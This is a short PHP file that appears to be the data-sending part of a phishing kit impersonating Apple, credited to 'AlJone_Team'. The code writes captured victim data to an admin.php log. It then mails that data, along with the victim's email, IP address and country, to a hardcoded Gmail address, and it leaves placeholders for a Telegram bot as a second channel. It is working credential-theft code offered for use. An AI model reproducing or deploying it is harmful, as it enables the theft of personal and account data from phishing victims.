<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Apple -
 * version 01
 * icq & telegram = @AlJone27
 
###############################################
#$            C0d3d by AlJone_Team           $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2021 Apple             $#
###############################################

**/

$yourmail  = 'kidabeiz7@gmail.com';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['Emailapp']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Apple" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="";
$chatId="";  
>